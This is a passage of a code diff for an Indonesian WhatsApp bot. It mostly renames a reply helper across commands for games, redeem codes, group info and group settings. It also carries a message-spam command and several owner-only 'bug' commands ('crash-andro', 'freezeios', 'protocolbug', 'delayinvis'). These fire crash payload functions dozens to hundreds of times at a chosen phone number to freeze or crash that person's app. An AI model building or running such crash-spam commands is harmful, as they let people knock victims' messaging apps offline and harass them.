-      if (!args[1]) return Reply(`*Masukin Jumlah Tersedia!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
-      if (isNaN(args[1])) return Reply(`*Jumlah Harus Angka!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
+      if (!args[0]) return replyV1(`*Masukin Kode Redemnya!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
+      if (!args[1]) return replyV1(`*Masukin Jumlah Tersedia!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
+      if (isNaN(args[1])) return replyV1(`*Jumlah Harus Angka!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
       db.redeem.isRedeem = true
       db.redeem.code = args[0]
       db.redeem.user = []
       db.redeem.maxRedeem = args[1]
-      Reply('Code Redeem, Berhasil Di Setting*')
+      replyV1('Code Redeem, Berhasil Di Setting*')
     }
     break
     case 'delredeem':
     case 'redeemdel': {
 
-if (!isOwner) return Reply(mess.owner || 'Command ini hanya bisa digunakan oleh owner.')
+if (!isOwner) return replyV1(mess.owner || 'Command ini hanya bisa digunakan oleh owner.')
       db.redeem = db.redeem || {
         isRedeem: false,
         code: "",
@@ -22343,10 +22316,10 @@ if (!isOwner) return Reply(mess.owner || 'Command ini hanya bisa digunakan oleh 
         maxRedeem: 0
       }
       if (db.redeem.isRedeem) {
-        Reply('*Redeem Code Dihapus!*')
+        replyV1('*Redeem Code Dihapus!*')
         delete db.redeem
       } else {
-        Reply('*Tidak ada sesi redeem*')
+        replyV1('*Tidak ada sesi redeem*')
       }
     }
     break
@@ -22356,14 +22329,14 @@ if (!isOwner) return Reply(mess.owner || 'Command ini hanya bisa digunakan oleh 
     case 'redeemlist':
     case 'listredeem': {
 
-if (!isOwner) return Reply(mess.owner || 'Command ini hanya bisa digunakan oleh owner.')
-      if (!db.redeem) return Reply('Tidak ada data redeem')
-      if (db.redeem.user.length === 0) return Reply('Tidak ada nomor yang sudah redeem')
+if (!isOwner) return replyV1(mess.owner || 'Command ini hanya bisa digunakan oleh owner.')
+      if (!db.redeem) return replyV1('Tidak ada data redeem')
+      if (db.redeem.user.length === 0) return replyV1('Tidak ada nomor yang sudah redeem')
       let list = 'Daftar Nomor yang Sudah Redeem:\n\n'
       db.redeem.user.forEach((nomor, index) => {
         list += `${index + 1}. ${nomor}\n`
       })
-      Reply(list)
+      replyV1(list)
     }
     break
 
@@ -22374,7 +22347,7 @@ let {
         rank,
         rankid
       } = await ranke(m.sender);
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       
       let teks = `*⚔️ RPG - PROFILE ⚔️*
 
@@ -22457,7 +22430,7 @@ _*Items Lainnya🎗️*_
   ${vircion} • Bibit Jeruk: ${global.db.erpg[m.sender].bibitjeruk}`
       await conn.sendMessage(
         m.chat, {
-          document: readProjectAsset('media/xeryuu.jpg'),
+          document: readProjectAsset('media/xeryuu.png'),
           mimetype: 'image/jpeg',
           fileName: `${global.botname}`,
           fileLength: 100000000000000,
@@ -22577,9 +22550,9 @@ case 'ww':
 
       // [ Membuat Room ]
       if (value === "create") {
-        if (chat in ww) return Reply("Group masih dalam sesi permainan");
+        if (chat in ww) return replyV1("Group masih dalam sesi permainan");
         if (playerOnGame(sender, ww) === true)
-          return Reply("Kamu masih dalam sesi game");
+          return replyV1("Kamu masih dalam sesi game");
         ww[chat] = {
           room: chat,
           owner: sender,
@@ -22594,19 +22567,19 @@ case 'ww':
           seer: false,
           guardian: [],
         };
-        await Reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");
+        await replyV1("Room berhasil dibuat, ketik *.ww join* untuk bergabung");
 
         // [ Join sesi permainan ]
       } else if (value === "join") {
-        if (!ww[chat]) return Reply("Belum ada sesi permainan");
+        if (!ww[chat]) return replyV1("Belum ada sesi permainan");
         if (ww[chat].status === true)
-          return Reply("Sesi permainan sudah dimulai");
+          return replyV1("Sesi permainan sudah dimulai");
         if (ww[chat].player.length > 16)
-          return Reply("Maaf jumlah player telah penuh");
+          return replyV1("Maaf jumlah player telah penuh");
         if (playerOnRoom(sender, chat, ww) === true)
-          return Reply("Kamu sudah join dalam room ini");
+          return replyV1("Kamu sudah join dalam room ini");
         if (playerOnGame(sender, ww) === true)
-          return Reply("Kamu masih dalam sesi game");
+          return replyV1("Kamu masih dalam sesi game");
         let data = {
           id: sender,
           number: ww[chat].player.length + 1,
@@ -22650,13 +22623,13 @@ case 'ww':
 
         // [ Game Play ]
       } else if (value === "start") {
-        if (!ww[chat]) return Reply("Belum ada sesi permainan");
+        if (!ww[chat]) return replyV1("Belum ada sesi permainan");
         if (ww[chat].player.length === 0)
-          return Reply("Room belum memiliki player");
+          return replyV1("Room belum memiliki player");
         if (ww[chat].player.length < 5)
-          return Reply("Maaf jumlah player belum memenuhi syarat");
+          return replyV1("Maaf jumlah player belum memenuhi syarat");
         if (playerOnRoom(sender, chat, ww) === false)
-          return Reply("Kamu belum join dalam room ini");
+          return replyV1("Kamu belum join dalam room ini");
         if (ww[chat].cooldown > 0) {
           if (ww[chat].time === "voting") {
             clearAllVote(chat, ww);
@@ -22673,9 +22646,9 @@ case 'ww':
           }
         }
         if (ww[chat].status === true)
-          return Reply("Sesi permainan telah dimulai");
+          return replyV1("Sesi permainan telah dimulai");
         if (ww[chat].owner !== sender)
-          return Reply(
+          return replyV1(
             `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
           );
         let list1 = "";
@@ -22887,57 +22860,57 @@ case 'ww':
         });
         await run(conn, chat, ww);
       } else if (value === "vote") {
-        if (!ww[chat]) return Reply("Belum ada sesi permainan");
+        if (!ww[chat]) return replyV1("Belum ada sesi permainan");
         if (ww[chat].status === false)
-          return Reply("Sesi permainan belum dimulai");
+          return replyV1("Sesi permainan belum dimulai");
         if (ww[chat].time !== "voting")
-          return Reply("Sesi voting belum dimulai");
+          return replyV1("Sesi voting belum dimulai");
         if (playerOnRoom(sender, chat, ww) === false)
-          return Reply("Kamu bukan player");
+          return replyV1("Kamu bukan player");
         if (dataPlayer(sender, ww).isdead === true)
-          return Reply("Kamu sudah mati");
+          return replyV1("Kamu sudah mati");
         if (!target || target.length < 1)
-          return Reply("Masukan nomor player");
-        if (isNaN(target)) return Reply("Gunakan hanya nomor");
+          return replyV1("Masukan nomor player");
+        if (isNaN(target)) return replyV1("Gunakan hanya nomor");
         if (dataPlayer(sender, ww).isvote === true)
-          return Reply("Kamu sudah melakukan voting");
+          return replyV1("Kamu sudah melakukan voting");
         const b = getPlayerById(chat, sender, parseInt(target), ww);
-        if (!b || b === false) return Reply('Player tidak terdaftar!');
+        if (!b || b === false) return replyV1('Player tidak terdaftar!');
         if (b.db.isdead === true)
-          return Reply(`Player ${target} sudah mati.`);
+          return replyV1(`Player ${target} sudah mati.`);
         if (ww[chat].player.length < parseInt(target))
-          return Reply("Invalid");
+          return replyV1("Invalid");
         if (getPlayerById(chat, sender, parseInt(target), ww) === false)
-          return Reply("Player tidak terdaftar!");
+          return replyV1("Player tidak terdaftar!");
         vote(chat, parseInt(target), sender, ww);
-        return Reply("✅ Vote");
+        return replyV1("✅ Vote");
       } else if (value == "exit") {
-        if (!ww[chat]) return Reply("Tidak ada sesi permainan");
+        if (!ww[chat]) return replyV1("Tidak ada sesi permainan");
         if (playerOnRoom(sender, chat, ww) === false)
-          return Reply("Kamu tidak dalam sesi permainan");
+          return replyV1("Kamu tidak dalam sesi permainan");
         if (ww[chat].status === true)
-          return Reply("Permainan sudah dimulai, kamu tidak bisa keluar");
-        Reply(`@${sender.split("@")[0]} Keluar dari permainan`, {
+          return replyV1("Permainan sudah dimulai, kamu tidak bisa keluar");
+        replyV1(`@${sender.split("@")[0]} Keluar dari permainan`, {
           withTag: true,
         });
         playerExit(chat, sender, ww);
       } else if (value === "delete") {
-        if (!ww[chat]) return Reply("Tidak ada sesi permainan");
+        if (!ww[chat]) return replyV1("Tidak ada sesi permainan");
         if (ww[chat].owner !== sender)
-          return Reply(
+          return replyV1(
             `Hanya @${
             ww[chat].owner.split("@")[0]
           } yang dapat menghapus sesi permainan ini`
           );
-        Reply("Sesi permainan berhasil dihapus").then(() => {
+        replyV1("Sesi permainan berhasil dihapus").then(() => {
           delete ww[chat];
         });
       } else if (value === "player") {
-        if (!ww[chat]) return Reply("Tidak ada sesi permainan");
+        if (!ww[chat]) return replyV1("Tidak ada sesi permainan");
         if (playerOnRoom(sender, chat, ww) === false)
-          return Reply("Kamu tidak dalam sesi permainan");
+          return replyV1("Kamu tidak dalam sesi permainan");
         if (ww[chat].player.length === 0)
-          return Reply("Sesi permainan belum memiliki player");
+          return replyV1("Sesi permainan belum memiliki player");
         let player = [];
         let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
         for (let i = 0; i < ww[chat].player.length; i++) {
@@ -23001,10 +22974,10 @@ case 'ww':
     break
 case 'idtolink':
 case 'grouplink': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const groupId = text?.trim()
     if (!groupId) {
-        return Reply(
+        return replyV1(
             `*Penggunaan Salah!*\n\n` +
             `Contoh:\n` +
             `${cmd} 120363xxxxxxxx@g.us`
@@ -23012,7 +22985,7 @@ case 'grouplink': {
     }
     // Validasi ID grup
     if (!groupId.endsWith('@g.us')) {
-        return Reply(
+        return replyV1(
             `❌ ID grup tidak valid!\n\n` +
             `Contoh ID yang benar:\n` +
             `120363xxxxxxxx@g.us`
@@ -23024,7 +22997,7 @@ case 'grouplink': {
         // Ambil kode invite
         const inviteCode = await conn.groupInviteCode(groupId)
         if (!inviteCode) {
-            return Reply('❌ Gagal mendapatkan kode invite grup.')
+            return replyV1('❌ Gagal mendapatkan kode invite grup.')
         }
         const link = `https://chat.whatsapp.com/${inviteCode}`
         let teks = `╭───「 *GROUP LINK* 」───
@@ -23036,10 +23009,10 @@ case 'grouplink': {
 ║ ${link}
 ║
 ╰──────────────────`
-        Reply(teks)
+        replyV1(teks)
     } catch (err) {
         console.error('ID TO LINK ERROR:', err)
-        return Reply(
+        return replyV1(
             `❌ *Gagal mengambil link grup!*\n\n` +
             `Kemungkinan:\n` +
             `• Bot belum join grup tersebut\n` +
@@ -23145,8 +23118,8 @@ case 'developer': {
 
 case "polling":
 case "custompolling": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return Reply("contoh:\n.polling agus|jelek 100|ganteng 0")
+if (!isCreator) return replyV1(mess.owner)
+if (!text) return replyV1("contoh:\n.polling agus|jelek 100|ganteng 0")
 
 let parts = text.split("|").map(v => v.trim())
 
@@ -23446,7 +23419,7 @@ await conn.sendMessage(m.chat, {
 break
 
 case "ambil": {
-if (!m.quoted) return Reply("Reply pesan yang ingin diambil")
+if (!m.quoted) return replyV1("Reply pesan yang ingin diambil")
 
 let msg = m.quoted.message
 
@@ -23456,22 +23429,22 @@ messageId: conn.generateMessageTag()
 }
 break
 case "member": {
-if (!m.isGroup) return Reply("Khusus grup")
+if (!m.isGroup) return replyV1("Khusus grup")
 
 let metadata = await conn.groupMetadata(m.chat)
 let participants = metadata.participants
 
 let total = participants.length
 
-Reply(`Total Member Grup : ${total}`)
+replyV1(`Total Member Grup : ${total}`)
 }
 break
 case "infogc": {
-if (!m.isGroup) return Reply("Khusus grup")
+if (!m.isGroup) return replyV1("Khusus grup")
 
 let metadata = await conn.groupMetadata(m.chat)
 
-Reply(`Info Grup :
+replyV1(`Info Grup :
 
 Nama : ${metadata.subject}
 ID : ${metadata.id}
@@ -23480,7 +23453,7 @@ Owner : ${metadata.owner}`)
 }
 break
 case "couple": {
-if (!m.isGroup) return Reply("Khusus grup")
+if (!m.isGroup) return replyV1("Khusus grup")
 
 let metadata = await conn.groupMetadata(m.chat)
 let participants = metadata.participants
@@ -23504,7 +23477,7 @@ mentions:[member1,member2]
 }
 break
 case "roastmem": {
-if (!m.isGroup) return Reply("Khusus grup")
+if (!m.isGroup) return replyV1("Khusus grup")
 
 let metadata = await conn.groupMetadata(m.chat)
 let participants = metadata.participants
@@ -23542,7 +23515,7 @@ mentions:[member]
 }
 break
 case "beban": {
-if (!m.isGroup) return Reply("Khusus grup")
+if (!m.isGroup) return replyV1("Khusus grup")
 let metadata = await conn.groupMetadata(m.chat)
 let participants = metadata.participants
 
@@ -23558,14 +23531,14 @@ mentions:[member]
 }
 break
 case "send": {
-if (!isCreator) return Reply(mess.owner)
-if (!m.isGroup) return Reply("Fitur ini hanya untuk grup")
-if (!m.quoted) return Reply("Reply pesan yang ingin dispam\nContoh .send 10")
-if (!text) return Reply("Contoh : .send 10")
+if (!isCreator) return replyV1(mess.owner)
+if (!m.isGroup) return replyV1("Fitur ini hanya untuk grup")
+if (!m.quoted) return replyV1("Reply pesan yang ingin dispam\nContoh .send 10")
+if (!text) return replyV1("Contoh : .send 10")
 
 let jumlah = parseInt(text)
-if (isNaN(jumlah)) return Reply("Masukkan angka")
-if (jumlah > 20) return Reply("Max spam 20")
+if (isNaN(jumlah)) return replyV1("Masukkan angka")
+if (jumlah > 20) return replyV1("Max spam 20")
 
 let msg = m.quoted.message
 
@@ -23576,16 +23549,16 @@ await conn.relayMessage(m.chat, msg, {})
 }
 break
 case "totalgc": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 
 let groups = await conn.groupFetchAllParticipating()
 let total = Object.keys(groups).length
 
-Reply(`Total Grup Bot : ${total}`)
+replyV1(`Total Grup Bot : ${total}`)
 }
 break
 case "idgrup": {
-if (!m.isGroup) return Reply("Fitur ini hanya untuk grup")
+if (!m.isGroup) return replyV1("Fitur ini hanya untuk grup")
 
 let id = m.chat
 
@@ -23630,27 +23603,27 @@ break
 case "getlinkgc":
 case "linkgroup": {
 if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.owner)
+if (!isCreator && !isAdmins) return replyV1(mess.owner)
 
 try {
 let link = await conn.groupInviteCode(m.chat)
-Reply(`Link Grup :
+replyV1(`Link Grup :
 
 https://chat.whatsapp.com/${link}`)
 } catch {
-Reply("Bot harus menjadi admin untuk mengambil link grup")
+replyV1("Bot harus menjadi admin untuk mengambil link grup")
 }
 
 } else {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 
 try {
 let link = await conn.groupInviteCode(m.chat)
-Reply(`Link Grup :
+replyV1(`Link Grup :
 
 https://chat.whatsapp.com/${link}`)
 } catch {
-Reply("Bot harus menjadi admin untuk mengambil link grup")
+replyV1("Bot harus menjadi admin untuk mengambil link grup")
 }
 
 }
@@ -23659,9 +23632,9 @@ break
 
 case 'groupinfo':
 case 'ginfo': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const meta = groupMetadata || m.metadata
-    if (!meta) return Reply('❌ Metadata grup belum tersedia, coba lagi.')
+    if (!meta) return replyV1('❌ Metadata grup belum tersedia, coba lagi.')
 
     const participants = Array.isArray(meta.participants) ? meta.participants : []
     const admins = participants.filter(p => p?.admin)
@@ -23670,7 +23643,7 @@ case 'ginfo': {
         ? new Date(Number(meta.creation) * 1000).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB'
         : '-'
 
-    return Reply(
+    return replyV1(
         `👥 *GROUP INFO*\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `🏷️ Nama: *${meta.subject || '-'}*\n` +
@@ -23688,10 +23661,10 @@ break
 
 case 'admins':
 case 'adminlist': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const meta = groupMetadata || m.metadata
     const admins = (meta?.participants || []).filter(p => p?.admin)
-    if (!admins.length) return Reply('❌ Data admin tidak ditemukan.')
+    if (!admins.length) return replyV1('❌ Data admin tidak ditemukan.')
 
     const mentions = admins.map(p => p.id || p.jid || p.phoneNumber || p.lid).filter(Boolean)
     const textAdmin = admins.map((p, i) => {
@@ -23699,7 +23672,7 @@ case 'adminlist': {
         return `${i + 1}. @${String(jid).split('@')[0]}${p.admin === 'superadmin' ? ' 👑' : ' 🛡️'}`
     }).join('\n')
 
-    return Reply(
+    return replyV1(
         `🛡️ *DAFTAR ADMIN*\n━━━━━━━━━━━━━━━━━━\n${textAdmin}`,
         { mentions }
     )
@@ -23708,8 +23681,8 @@ break
 
 case 'botadmin':
 case 'botstatus': {
-    if (!m.isGroup) return Reply(mess.group)
-    return Reply(
+    if (!m.isGroup) return replyV1(mess.group)
+    return replyV1(
         `🤖 *BOT STATUS GRUP*\n\n` +
         `👤 Admin kamu: *${isAdmins ? 'YA' : 'TIDAK'}*\n` +
         `🤖 Bot admin: *${isBotAdmins ? 'YA' : 'TIDAK'}*\n` +
@@ -23720,87 +23693,87 @@ break
 
 case 'setname':
 case 'setsubject': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
 
     const subject = String(text || '').trim()
-    if (!subject) return Reply(`Contoh: ${prefix}setname Nama Grup Baru`)
-    if (subject.length > 100) return Reply('❌ Nama grup maksimal 100 karakter.')
+    if (!subject) return replyV1(`Contoh: ${prefix}setname Nama Grup Baru`)
+    if (subject.length > 100) return replyV1('❌ Nama grup maksimal 100 karakter.')
 
     try {
         await conn.groupUpdateSubject(m.chat, subject)
-        return Reply(`✅ Nama grup berhasil diubah menjadi:\n*${subject}*`)
+        return replyV1(`✅ Nama grup berhasil diubah menjadi:\n*${subject}*`)
     } catch (err) {
         console.error('[GROUP SETNAME ERROR]', err)
-        return Reply(`❌ Gagal mengubah nama grup.\n${err?.message || err}`)
+        return replyV1(`❌ Gagal mengubah nama grup.\n${err?.message || err}`)
     }
 }
 break
 
 case 'setdesc':
 case 'setdescription': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
 
     const description = String(text || '').trim()
-    if (!description) return Reply(`Contoh: ${prefix}setdesc Deskripsi grup`)
-    if (description.length > 4096) return Reply('❌ Deskripsi grup maksimal 4096 karakter.')
+    if (!description) return replyV1(`Contoh: ${prefix}setdesc Deskripsi grup`)
+    if (description.length > 4096) return replyV1('❌ Deskripsi grup maksimal 4096 karakter.')
 
     try {
         await conn.groupUpdateDescription(m.chat, description)
-        return Reply('✅ Deskripsi grup berhasil diperbarui.')
+        return replyV1('✅ Deskripsi grup berhasil diperbarui.')
     } catch (err) {
         console.error('[GROUP SETDESC ERROR]', err)
-        return Reply(`❌ Gagal mengubah deskripsi grup.\n${err?.message || err}`)
+        return replyV1(`❌ Gagal mengubah deskripsi grup.\n${err?.message || err}`)
     }
 }
 break
 
 case 'revoke': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
 
     try {
         await conn.groupRevokeInvite(m.chat)
         const code = await conn.groupInviteCode(m.chat)
-        return Reply(
+        return replyV1(
             `✅ Link grup berhasil di-reset.\n\n` +
             `🔗 https://chat.whatsapp.com/${code}`
         )
     } catch (err) {
         console.error('[GROUP REVOKE ERROR]', err)
-        return Reply(`❌ Gagal mereset link grup.\n${err?.message || err}`)
+        return replyV1(`❌ Gagal mereset link grup.\n${err?.message || err}`)
     }
 }
 break
 
 case 'setrules': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
 
     const rules = String(text || '').trim()
     if (!rules) {
-        return Reply(
+        return replyV1(
             `Contoh:\n${prefix}setrules 1. Dilarang spam\n2. Saling menghormati\n3. Ikuti aturan grup`
         )
     }
 
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     global.db.groups[m.chat].rules = rules
-    return Reply('✅ Peraturan grup berhasil disimpan.')
+    return replyV1('✅ Peraturan grup berhasil disimpan.')
 }
 break
 
 case 'rules':
 case 'grouprules':
 case 'getrules': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const rules = String(global.db?.groups?.[m.chat]?.rules || '').trim()
-    if (!rules) return Reply(`📜 Belum ada peraturan grup.\n\nAdmin dapat mengatur dengan ${prefix}setrules <teks>`)
-    return Reply(
+    if (!rules) return replyV1(`📜 Belum ada peraturan grup.\n\nAdmin dapat mengatur dengan ${prefix}setrules <teks>`)
+    return replyV1(
         `📜 *PERATURAN GRUP*\n━━━━━━━━━━━━━━━━━━\n${rules}`
     )
 }
@@ -23808,25 +23781,25 @@ break
 
 case 'delrules':
 case 'resetrules': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     global.db.groups[m.chat].rules = ''
-    return Reply('✅ Peraturan grup berhasil dihapus.')
+    return replyV1('✅ Peraturan grup berhasil dihapus.')
 }
 break
 
 case 'resetprefix': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     global.db.groups[m.chat].prefix = '.'
-    return Reply(`✅ Prefix grup dikembalikan ke default: *.*`)
+    return replyV1(`✅ Prefix grup dikembalikan ke default: *.*`)
 }
 break
 
 case 'groupstats': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const meta = groupMetadata || m.metadata
     const participants = meta?.participants || []
     const admins = participants.filter(p => p?.admin)
@@ -23835,7 +23808,7 @@ case 'groupstats': {
         ? Object.keys(groupDb.inactive).length
         : 0
 
-    return Reply(
+    return replyV1(
         `📊 *GROUP STATS*\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `👥 Total member: *${participants.length}*\n` +
@@ -23853,9 +23826,9 @@ break
 case 'autoadzan':
 case 'autoazan':
 case 'autoshola': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
 
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     const mode = String(args[0] || '').toLowerCase()
@@ -23863,7 +23836,7 @@ case 'autoshola': {
     if (mode === 'on') {
         global.db.groups[m.chat].autoshola = true
         const cfg = global.autoSholatConfig || {}
-        return Reply(
+        return replyV1(
             `✅ AUTO ADZAN / AUTO SHOLAT AKTIF\n\n` +
             `Jadwal harian diambil otomatis untuk ${cfg.citySearch || 'JAKARTA PUSAT'} (${cfg.timezone || 'Asia/Jakarta'}).\n` +
             `Saat waktu sholat tiba, bot akan mengirim audio adzan, menutup grup selama 5 menit, lalu membukanya kembali.\n\n` +
@@ -23873,28 +23846,28 @@ case 'autoshola': {
 
     if (mode === 'off') {
         global.db.groups[m.chat].autoshola = false
-        return Reply('❌ Auto Adzan / Auto Sholat grup ini berhasil dimatikan.')
+        return replyV1('❌ Auto Adzan / Auto Sholat grup ini berhasil dimatikan.')
     }
 
-    return Reply(
+    return replyV1(
         `Penggunaan:\n${prefix}autoshola on\n${prefix}autoshola off\n\nAlias:\n${prefix}autoadzan on\n${prefix}autoadzan off`
     )
 }
 break
 
 case "onlygc": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 
 let mode = args[0]
 
 if (mode === "on") {
 onlygc = true
-Reply("✅ Only group diaktifkan")
+replyV1("✅ Only group diaktifkan")
 } else if (mode === "off") {
 onlygc = false
-Reply("❌ Only group dimatikan")
+replyV1("❌ Only group dimatikan")
 } else {
-Reply("Contoh:\n.onlygc on\n.onlygc off")
+replyV1("Contoh:\n.onlygc on\n.onlygc off")
 }
 
 }
@@ -23903,14 +23876,14 @@ break
 //~~~~~~~~~~~~~ ALL COMAND ~~~~~~~~~~~~~~~~~//
 
             case 'delayinvis': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await Delayinvis(target);
@@ -23923,14 +23896,14 @@ break
 
             case 'blankclick':
             case 'crash-andro': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 5; i++) {
                    await FreezeCrash(target);
@@ -23941,14 +23914,14 @@ break
             break;
             case 'forclose-delay':
             case 'protocolbug': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 200; i++) {
                    await fcv2(target);
@@ -23958,14 +23931,14 @@ break
             break;
             case 'iphonekill':
             case 'freezeios': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await NanBlankIphone(target);
@@ -23974,14 +23947,14 @@ break
             }
             break;
                         case 'delayinvishard': {
-                if (!isCreator) return Reply(mess.owner)
+                if (!isCreator) return replyV1(mess.owner)
                 if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                 
                 let jidx = q.replace(/[^0-9]/g, "");
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 90; i++) {
                    await Truenullv4(conn, target);
@@ -23993,14 +23966,14 @@ break
             break;
                         case 'spamcallbiasa':
             case 'for': {
